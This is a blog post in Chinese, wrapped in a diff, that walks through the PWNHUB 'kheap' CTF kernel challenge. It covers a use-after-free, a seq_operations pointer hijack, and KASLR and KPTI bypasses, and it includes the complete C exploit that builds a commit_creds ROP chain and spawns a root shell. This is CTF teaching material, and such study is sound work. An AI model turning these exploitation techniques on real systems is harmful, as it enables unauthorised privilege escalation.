@@ -1,0 +1,722 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="CTFer" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="CTFer" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="CTFer" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="pwn" />
+
+
+<link rel="canonical" href="http://example.com/2023/10/04/Linux-Kernel-Pwn/">
+
+
+
+  <title>
+Linux-Kernel-Pwn |
+Arashimuのblog = CTFer</title>
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Linux-Kernel-Pwn
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2023-10-04 23:06:23">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-10-04T23:06:23+08:00">2023-10-04</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Arashimuのblog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgrvbd6j20zk0m8qv5.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexe4oykj20zk0m87ji.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeyvx1d4j20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/04/Linux-Kernel-Pwn/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="岚沐">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="CTFer">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="pwnhub-kheap"><a class="markdownIt-Anchor" href="#pwnhub-kheap"></a> PWNHUB-kheap</h2>
+<h3 id="保护与漏洞点"><a class="markdownIt-Anchor" href="#保护与漏洞点"></a> 保护与漏洞点</h3>
+<p>保护措施：kaslr、kpti、smep</p>
+<p>漏洞点在keap.ko中的keap_ioctl中，存在UAF漏洞</p>
+<img data-src="/images/linux-kernel-pwn4.jpg" style="zoom:80%;" />
+<p>对于ioctl，需要传入的参数是一个指向<code>info</code>结构体的指针</p>
+<img data-src="/images/linux-kernel-pwn7.jpg" style="zoom:80%;" />
+<p>创建的堆大小为<code>0x20</code>，这个大小攻击点感觉就是指向劫持<code>seq_operations</code>了</p>
+<img data-src="/images/linux-kernel-pwn26.jpg" style="zoom:80%;" />
+<h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3>
+<p>先给出官方的exp</p>
+<pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span>
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span>
+&#123;</span>
+  <span class="hljs-type">uint64_t</span> idx;
+  <span class="hljs-type">char</span> *ptr;
+&#125;;
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">request</span>
+&#123;</span>
+  <span class="hljs-type">char</span> *ptr;
+  <span class="hljs-type">uint64_t</span> len;
+&#125;;
+
+
+<span class="hljs-type">int</span> dev_fd;
+<span class="hljs-type">uint64_t</span> user_cs,user_ss,user_eflag,user_rsp;
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">save_state</span><span class="hljs-params">()</span>
+&#123;
+  <span class="hljs-keyword">asm</span>(
+    <span class="hljs-string">&quot;movq %%cs, %0;&quot;</span>
+    <span class="hljs-string">&quot;movq %%ss, %1;&quot;</span>
+    <span class="hljs-string">&quot;movq %%rsp, %3;&quot;</span>
+    <span class="hljs-string">&quot;pushfq;&quot;</span>
+    <span class="hljs-string">&quot;pop %2;&quot;</span>
+    : <span class="hljs-string">&quot;=r&quot;</span>(user_cs),<span class="hljs-string">&quot;=r&quot;</span>(user_ss),<span class="hljs-string">&quot;=r&quot;</span>(user_eflag),<span class="hljs-string">&quot;=r&quot;</span>(user_rsp)
+    :
+    : <span class="hljs-string">&quot;memory&quot;</span>
+  );
+&#125;
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">new</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx)</span>
+&#123;
+  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">arg</span>=</span>&#123;idx,<span class="hljs-literal">NULL</span>&#125;;
+  ioctl(dev_fd,<span class="hljs-number">0x10000</span>,&amp;arg);
+&#125;
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx)</span>
+&#123;
+  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">arg</span>=</span>&#123;idx,<span class="hljs-literal">NULL</span>&#125;;
+  ioctl(dev_fd,<span class="hljs-number">0x10001</span>,&amp;arg);
+&#125;
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">choose</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx)</span>
+&#123;
+  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">arg</span>=</span>&#123;idx,<span class="hljs-literal">NULL</span>&#125;;
+  ioctl(dev_fd,<span class="hljs-number">0x10002</span>,&amp;arg);
+&#125;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">seq_open</span><span class="hljs-params">()</span>
+&#123;
+  <span class="hljs-type">int</span> seq;
+  <span class="hljs-keyword">if</span> ((seq=open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>,O_RDONLY))==<span class="hljs-number">-1</span>)
+  &#123;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X] Seq Open Error&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+  &#125;
+  <span class="hljs-keyword">return</span> seq;
+&#125;
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">get_shell</span><span class="hljs-params">()</span>
+&#123;
+  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
+  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+&#125;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
+&#123;
+  save_state();
+  dev_fd=open(<span class="hljs-string">&quot;/dev/kheap&quot;</span>,O_RDWR);
+  <span class="hljs-keyword">if</span> (dev_fd&lt;<span class="hljs-number">0</span>)
+  &#123;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X] Device Open Error&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+  &#125;
+  
+
+  <span class="hljs-type">uint64_t</span> *buf=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>); 
+  <span class="hljs-type">uint64_t</span> *recv=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);
+  
+  new(<span class="hljs-number">0</span>);
+  choose(<span class="hljs-number">0</span>);
+  delete(<span class="hljs-number">0</span>);        <span class="hljs-comment">//释放了大小为0x20的堆heap</span>
+  
+  <span class="hljs-type">int</span> seq_fd=seq_open();  <span class="hljs-comment">//调用seq_open，会创建0x20大小的堆来保存seq_operations</span>
+  
+  read(dev_fd,(<span class="hljs-type">char</span> *)recv,<span class="hljs-number">0x20</span>);
+  
+  <span class="hljs-type">uint64_t</span> kernel_base=recv[<span class="hljs-number">0</span>]<span class="hljs-number">-0x33F980</span>;
+  <span class="hljs-type">uint64_t</span> prepare_kernel_cred=kernel_base+<span class="hljs-number">0xcebf0</span>;
+  <span class="hljs-type">uint64_t</span> commit_creds=kernel_base+<span class="hljs-number">0xce710</span>;
+  <span class="hljs-type">uint64_t</span> kpti_trampoline=kernel_base+<span class="hljs-number">0xc00fb0</span>;   <span class="hljs-comment">//会同时绕过kpti，然后执行swapg和retq</span>
+  <span class="hljs-type">uint64_t</span> seq_read=kernel_base+<span class="hljs-number">0x340560</span>;
+  <span class="hljs-type">uint64_t</span> pop_rdi=kernel_base+<span class="hljs-number">0x2517a</span>;
+  <span class="hljs-type">uint64_t</span> mov_rdi_rax=kernel_base+<span class="hljs-number">0x5982f4</span>;
+  <span class="hljs-type">uint64_t</span> gadget=kernel_base+<span class="hljs-number">0x94a10</span>;  <span class="hljs-comment">//0xffffffff81094a10 : xchg esp, eax ; ret</span>
+  
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel_base: 0x%lx\n&quot;</span>,kernel_base);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] prepare_kernel_cred: 0x%lx\n&quot;</span>,prepare_kernel_cred);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] commit_creds: 0x%lx\n&quot;</span>,commit_creds);
+  
+  <span class="hljs-comment">//gadget&amp;0xFFFFF000=&gt;地址对齐</span>
+  <span class="hljs-type">uint64_t</span> *mmap_addr=mmap((<span class="hljs-type">void</span> *)(gadget&amp;<span class="hljs-number">0xFFFFF000</span>),PAGE_SIZE,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_SHARED,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] mmap_addr: 0x%lx\n&quot;</span>,(<span class="hljs-type">uint64_t</span>)mmap_addr);
+  
+  <span class="hljs-comment">//((char *)mmap_addr)+0xa10 =&gt; 得到gadget地址的低4字节</span>
+  <span class="hljs-type">uint64_t</span> *ROP=(<span class="hljs-type">uint64_t</span> *)(((<span class="hljs-type">char</span> *)mmap_addr)+<span class="hljs-number">0xa10</span>),i=<span class="hljs-number">0</span>;
+  *(ROP+i++)=pop_rdi;
+  *(ROP+i++)=<span class="hljs-number">0</span>;
+  *(ROP+i++)=prepare_kernel_cred;
+  *(ROP+i++)=commit_creds;
+  *(ROP+i++)=kpti_trampoline+<span class="hljs-number">22</span>;   
+  *(ROP+i++)=<span class="hljs-number">0</span>;
+  *(ROP+i++)=<span class="hljs-number">0</span>;
+  *(ROP+i++)=(<span class="hljs-type">uint64_t</span>)get_shell;
+  *(ROP+i++)=user_cs;
+  *(ROP+i++)=user_eflag;
+  *(ROP+i++)=user_rsp;
+  *(ROP+i++)=user_ss;
+  
+  <span class="hljs-built_in">memcpy</span>(buf,recv,<span class="hljs-number">0x20</span>); 
+  buf[<span class="hljs-number">0</span>]=(<span class="hljs-type">uint64_t</span>)gadget;        <span class="hljs-comment">//劫持seq_ops的.start函数指针</span>
+  write(dev_fd,(<span class="hljs-type">char</span> *)buf,<span class="hljs-number">0x20</span>); <span class="hljs-comment">//把一开始泄露的地址重新写回select</span>
+  read(seq_fd,<span class="hljs-literal">NULL</span>,<span class="hljs-number">1</span>);
+
+&#125;
+<span class="hljs-comment">/*
+0xffffffff81000000
+0xffffa09b42945120
+0x33F980
+
+0xffffffff8112a6de : xchg eax, esp ; ret
+0xffffffff81094a10 : xchg esp, eax ; ret
+利用 xchg eax, esp 这个位于内核的 gadget，将栈转移到用户态低 32 位地址相同的地方。这个时候，我们只需要提前在这个位置布置上我们的 gadgets，就能达到提权的效果。
+注意：xchg eax, esp将清空两个寄存器的高位部分。因此执行完成后，%rsp 的高四字节为0，此时指向用户空间。我们可以使用 mmap 函数占据这块内存，并放上 ROP 链。
+
+file ./vmlinux
+add-symbol-file ./vmlinux 0xffffffff81000000
+add-symbol-file ./kheap.ko  0xffffffffc0002000
+target remote 0.0.0.0:1234
+*/</span>
+</code></pre>
+<h4 id="绕过kaslr保护"><a class="markdownIt-Anchor" href="#绕过kaslr保护"></a> 绕过kaslr保护</h4>
+<p>泄漏地址之前，可以进行以下操作之一，为了方便找到偏移</p>
+<ul>
+<li>
+<p>将启动脚本中的<code>kaslr</code>选项去掉，改为<code>nokaslr</code>，那么之后泄漏出来的地址减去<code>0xffffffff81000000</code>就可以得到偏移</p>
+</li>
+<li>
+<p>在解压的rootfs中的初始化脚本<code>init</code>中，以root用户启动，然后查看<code>/proc/xxx</code>，找到基地址base，UAF泄漏地址后减去base即可得到偏移。同时可以用lsmod查看keap.ko加载的地址，方便后续调试</p>
+<img data-src="/images/linux-kernel-pwn13.jpg" style="zoom:80%;" />
+</li>
+</ul>
+<p>接着触发UAF，在kheap_read中</p>
+<img data-src="/images/linux-kernel-pwn6.jpg" style="zoom:80%;" />
+<p>可以把select保存的地址读到用户空间buf中，通过gdb调试，把keap.ko的符号表载入到gdb中然后在kheap_read下断点</p>
+<img data-src="/images/linux-kernel-pwn14.jpg" style="zoom:80%;" />
+<p>这样就可以得到泄漏的地址的偏移为<code>0x33f980</code>，然后就可以得到基地址了</p>
+<h4 id="绕过kpti保护"><a class="markdownIt-Anchor" href="#绕过kpti保护"></a> 绕过kpti保护</h4>
+<p>把控制流劫持到函数<code>swapgs_restore_regs_and_return_to_usermode</code>，这里一方面会绕过kpti保护(即修改cr3寄存器的值)，另一方面会切换回用户态，即调用swapgs和iretq，这样我们可以在回到用户态的时候劫持rip去getshell</p>
+<p>不需要从这个函数开头开始执行，从<code>mov rsp,gs:qword 6004</code>开始即可</p>
+<img data-src="/images/linux-kernel-pwn10.jpg" style="zoom:80%;" />
+<h4 id="劫持seq_operations"><a class="markdownIt-Anchor" href="#劫持seq_operations"></a> 劫持seq_operations</h4>
+<p>又是释放的堆大小为0x20，而为了劫持控制流，故考虑修改seq_operations结构体的函数指针。</p>
+<p>seq_operations结构体大小为0x20</p>
+<pre class="highlight"><code class="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span>
+    <span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos); <span class="hljs-comment">//开始读数据项，通常需要在这个函数中加锁，以防止并行访问数据</span>
+    <span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v); <span class="hljs-comment">//停止数据项，和start相对，通常需要解锁</span>
+    <span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos); <span class="hljs-comment">//下一个要处理的数据项</span>
+    <span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v); <span class="hljs-comment">//打印数据项到临时缓冲区</span>
+&#125;;
+</code></pre>
+<p>这个结构体设计出来是为了简化为/proc文件的读写操作而设计的</p>
+<p>打开<code>/proc/self/stat</code>文件的时候，会申请出seq_operations结构体，而申请出的结构体就在之前释放的堆上，保存在了select全局变量中，那么之后我们利用UAF，通过kheap_write函数，就可以修改这个seq_operations结构体的函数指针，然后调用read读即可调用函数指针，从而劫持控制流</p>
+<p>打开<code>/proc/self/stat</code>文件时，会先调用<code>single_open()</code>函数去初始化seq_operations结构体</p>
+<img data-src="/images/linux-kernel-pwn20.jpg" style="zoom:80%;" />
+<p>将vmlinux的符号表导入gdb中，建议关闭kaslr调试，这样就可以指定起始地址为<code>0xffffffff81000000</code>方便调试，在single_open下断点</p>
+<img data-src="/images/linux-kernel-pwn18.jpg" style="zoom:80%;" />
+<p>可以发现确实创建了0x20大小的堆，然后申请堆用来分配seq_operations结构体</p>
+<p><img data-src="/images/linux-kernel-pwn19.jpg" alt="" /></p>
+<p>记录在single_open申请出来堆地址，然后在kheap_read下断点，然后到达调用copy_to_user处，rsi保存的就是select的值，即之前UAF的堆地址，可以发现这两者一样</p>
+<img data-src="/images/linux-kernel-pwn21.jpg" style="zoom:80%;" />
+<p>这样，就把seq_operations结构体劫持到了select上，之后利用kheap_write修改函数指针即可</p>
+<h4 id="函数偏移"><a class="markdownIt-Anchor" href="#函数偏移"></a> 函数偏移</h4>
+<p>首先需要提权，考虑使用</p>
+<pre class="highlight"><code class="c">commit_creds(prepare_kernel_cred(<span class="hljs-number">0</span>))
+</code></pre>
+<p>在vmlinux找到对应函数的地址，还有<code>pop rdi;ret</code>的gadget</p>
+<p>commit_creads函数：</p>
+<img data-src="/images/linux-kernel-pwn3.jpg" style="zoom:80%;" />
+<p>prepare_kernel_cread函数：</p>
+<img data-src="/images/linux-kernel-pwn1.jpg" style="zoom:80%;" />
+<p>pop rdi; ret ：(这里我使用ROPgadget，没有使用ropper，感觉ROPgadget也不是很慢)</p>
+<img data-src="/images/linux-kernel-pwn9.jpg" style="zoom:80%;" />
+<p>得到地址之后均减去<code>0xffffffff81000000</code>即可得到对应的偏移</p>
+<h4 id="提权getshell"><a class="markdownIt-Anchor" href="#提权getshell"></a> 提权getshell</h4>
+<p>为了利用ROP，我们需要把在处于内核态的时候，把rsp劫持到用户态上，因为我们的ROP是保存在用户态上的，这需要用到一个gadget指令</p>
+<pre class="highlight"><code class="asm">xchg esp, eax ; ret
+</code></pre>
+<p>利用 xchg eax, esp 这个位于内核的 gadget，将栈转移到用户态低 32 位地址相同的地方。这个时候，我们只需要提前在这个位置布置上我们的 gadgets，就能达到提权的效果。</p>
+<p>注意：xchg eax, esp将清空两个寄存器的高位部分。因此执行完成后，%rsp 的高四字节为0，此时指向用户空间。我们可以使用 mmap 函数占据这块内存，并放上 ROP 链。</p>
+<p>在vmlinux的ROP中找到对应的gadget，然后劫持seq_operations的函数指针到这里，然后改变rsp到用户态栈，接着就执行ret指令了</p>
+<pre class="highlight"><code class="">0xffffffff81094a10 : xchg esp, eax ; ret
+</code></pre>
+<p>先调用kheap_write去修改seq_operations的函数指针</p>
+<img data-src="/images/linux-kernel-pwn22.jpg" style="zoom:80%;" />
+<p>然后调用read去读<code>/porc/self/stat</code>，出发seq_operations的函数指针。在<code>0xffffffff81094a10</code>(即改变rsp到用户态栈上)下断点</p>
+<img data-src="/images/linux-kernel-pwn23.jpg" style="zoom:80%;" />
+<img data-src="/images/linux-kernel-pwn24.jpg" style="zoom:80%;" />
+<p>执行完后发现rsp确实到用户态上了</p>
+<img data-src="/images/linux-kernel-pwn/25.jpg" style="zoom:80%;" />
+<p>然后就是我们的ROP链了，接着就提权成功了</p>
+
+      <div class="tags">
+          <a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i> pwn</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2023-10-04 23:14:17" itemprop="dateModified" datetime="2023-10-04T23:14:17+08:00">2023-10-04</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="岚沐 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="岚沐 Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="岚沐 PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>岚沐 <i class="ic i-at"><em>@</em></i>CTFer
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2023/10/04/Linux-Kernel-Pwn/" title="Linux-Kernel-Pwn">http://example.com/2023/10/04/Linux-Kernel-Pwn/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/04/16/house-of-pig/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipesx5fdwj20zk0m81kx.jpg" title="house_of_pig">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>house_of_pig</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnhub-kheap"><span class="toc-number">1.</span> <span class="toc-text"> PWNHUB-kheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text"> 保护与漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text"> 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87kaslr%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 绕过kaslr保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87kpti%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 绕过kpti保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81seq_operations"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 劫持seq_operations</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%81%8F%E7%A7%BB"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 函数偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83getshell"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 提权getshell</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="岚沐"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">岚沐</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">28</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">6</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>About</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
